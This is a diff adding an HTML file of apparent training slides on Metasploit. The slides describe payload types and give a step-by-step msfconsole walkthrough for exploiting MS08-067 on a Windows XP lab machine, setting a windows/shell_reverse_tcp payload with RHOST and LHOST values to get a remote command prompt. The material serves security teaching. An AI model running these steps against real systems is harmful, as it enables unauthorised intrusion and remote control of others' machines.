@@ -1,0 +1,127 @@
+
+<!doctype html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Keynote</title>
+--------------------------------------------------------------------------------------------------------------------
+#The Metasploit framework is a very powerful tool which can be used by cybercriminals as well as ethical hackers to probe systematic vulnerabilities on networks and servers. 
+
+#Though Metasploit is now owned by the security company Rapid7, an open source edition is still available, with development largely driven by the security community.
+
+#Metasploit’s modular and flexible architecture helps developers efficiently create working exploits as new vulnerabilities are discovered
+
+#Metasploit now includes more than 1677 exploits organized over 25 platforms, including Android, PHP, Python, Java, Cisco, and more. The framework also carries nearly 500 payloads, 
+--------------------------------------------------------------------------------------------------------------------
+#Command shell payloads that enable users to run scripts or random commands against a host
+#Dynamic payloads that allow testers to generate unique payloads to evade antivirus software
+#Meterpreter payloads that allow users to commandeer device monitors using VMC and to take over sessions or upload and download files
+#Static payloads that enable port forwarding and communications between networks
+
+#Exploits: Tools used to take advantages of system weaknesses 
+Payloads: sets of malicious code.
+
+--------------------------------------------------------------------------------------------------------------------
+#Starting metasploit
+In Kali Linux, Metasploit is in our path, so we can start it anywhere on the system. But before you start Metasploit, you will want to start the PostgreSQL database, which Metasploit will use to track what you do.
+    root@kali:~# service postgresql start
+This command creates a PostgreSQL user called msf3 and a corresponding database to store our data. It also starts Metasploit’s remote procedure call (RPC) server and web Server 
+--------------------------------------------------------------------------------------------------------------------
+root@kali:~# service metasploit start
+
+we’ll use Msfconsole, the Metasploit text-based console, and Msfcli, the command line interface. Either interface can be used to run Metasploit modules, start the console by entering msfconsole.
+root@kali:~# msfconsole
+--------------------------------------------------------------------------------------------------------------------
+#service postgresql start  - start the database to store data
+#Msfdb  - to see the list of metaploit database
+#msfdb reinit  - delete and re initiate the database
+#Msfconsole  - loading the metasploit modules tree
+ msf5> help – shows msf the list of available commands with description 
+--------------------------------------------------------------------------------------------------------------------
+Windows xp weakness
+##MS08-067 - patched an issue in the netapi32.dll that could allow attackers to use a specially crafted remote procedure call request via the Server Message Block (SMB) service to take over a target system
+Ms08-067 - Vulnerability in Server service could allow remote code execution. Content provided by Microsoft. 
+
+#Again we find that the correct module name for this vulnerability is exploit/windows/smb/ms08_067_netapi. Once you’ve identified a module to use, enter the info command with the module name
+Msf > search ms08-067 – to find the availability of correct payload module.
+msf > info exploit/windows/smb/ms08_067_netapi
+--------------------------------------------------------------------------------------------------------------------
+Descriptive name and  followed by the module name.
+#Platform  tells us that this exploit is for Windows systems.
+#Privileged x tells us whether this module requires or grants high. privileges on the target.
+#Rank lists the exploit’s potential impact on the target. Exploits are
+ranked from manual to excellent.
+#Available targets lists operating system versions and patch levels that the module can exploit.
+#Basic options { lists various options for the module that can be set to make a module better meet our needs.
+#Payload information | contains information to help Metasploit decide which payloads it can use with this exploit.
+#Description includes more details about the particular vulnerability.
+#References contains a link to online vulnerability database entries.
+--------------------------------------------------------------------------------------------------------------------
+msf > use windows/smb/ms08_067_netapi
+
+After typing this command
+
+msf exploit(ms08_067_netapi) > 
+
+msf exploit(ms08_067_netapi) > show options 
+This will display the payload options.
+
+RHOST
+The RHOST option u refers to the remote host we want to exploit. This
+option is required because it gives Metasploit a target to attack
+--------------------------------------------------------------------------------------------------------------------
+Payloads commands
+#exploit – tell the metasploit to run module 
+#Show payloads – to check compatible payloads for all Operating systems
+#Show targets – you can see available targets 
+#Show options- to see information that metasploit needs from you to run your chosen module.
+--------------------------------------------------------------------------------------------------------------------
+parameter
+# The RHOST option u refers to the remote host we want to exploit.
+#RPORT  - refers to the remote port to attack
+#0 Automatic Targeting x. This is the target operating system and version.
+#LPORT, for the local port to connect
+    Set up RHOST - msf exploit(ms08_067_netapi) > set RHOST 192.168.100.110
+#Let’s select a Windows reverse shell for our payload. Set a payload the same way you set the RHOST option: set payload <payload to use>.
+#msf exploit(ms08_067_netapi) > set payload windows/shell_reverse_tcp
+#payload => windows/shell_reverse_tcp
+#enter exploit, send our exploit off again
+
+#Once all commands are successful- you will get access to C:\WINDOWS\system32>
+--------------------------------------------------------------------------------------------------------------------
+Starting Metasploit Framework in Kali VM:
+#service postgresql start
+#service metasploit start
+#msfconsole
+
+1) Metasploit search command usage
+#search ms08–067
+
+2) Metasploit Info command usage
+#Info exploit/windows/smb/ms08_067_netapi
+
+3) Metasploit use command usage
+#use windows/smb/ms08_067_netapi
+
+4) Setting up the Module Options in Metasploit
+#show options
+
+5) Setting RHOST to Target Windows XP VM IP Address
+#Set RHOST 192.168.0.8
+
+6) Using an Available Target for specific Metasploit Module
+#show targets
+#set Target (Target Number)
+
+7) Selecting and using any of Compatible Payloads for this Exploit module
+#show payloads
+#set payload windows/shell_reverse_tcp
+
+8) Setting up Payload Options before exploitation
+#show options
+#set LHOST 192.168.0.7
+
+9) Exploiting the Target with Metasploit
+#exploit
+
+--------------------------------------------------------------------------------------------------------------------
+</html>
